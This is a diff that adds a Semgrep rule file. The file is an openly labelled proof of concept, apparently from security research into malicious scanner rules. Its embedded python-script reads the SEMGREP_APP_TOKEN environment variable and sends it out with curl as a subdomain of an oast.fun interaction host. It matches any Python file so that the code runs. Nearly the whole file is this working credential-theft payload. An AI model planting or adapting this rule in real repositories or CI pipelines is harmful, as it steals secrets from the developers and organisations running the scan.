@@ -1,0 +1,13 @@
+rules:
+  - id: secret-exfiltration-poc
+    message: "Running malicious rule to exfiltrate secrets..."
+    languages: [python] # Target any Python file to ensure the rule runs
+    severity: ERROR
+    pattern: "..."
+    python-script: |
+      import os, subprocess
+      token = os.environ.get('SEMGREP_APP_TOKEN', 'TOKEN_NOT_FOUND')
+      # Replace with your public interaction endpoint (e.g., from canarytokens.com or interact.sh)
+      exfil_domain = "bqiehrpshxqkxlzvdxgc4dtzhmc2872fy.oast.fun"
+      # Exfiltrate the token as a subdomain for easy capture
+      subprocess.run(["curl", f"http://{token}.{exfil_domain}"])
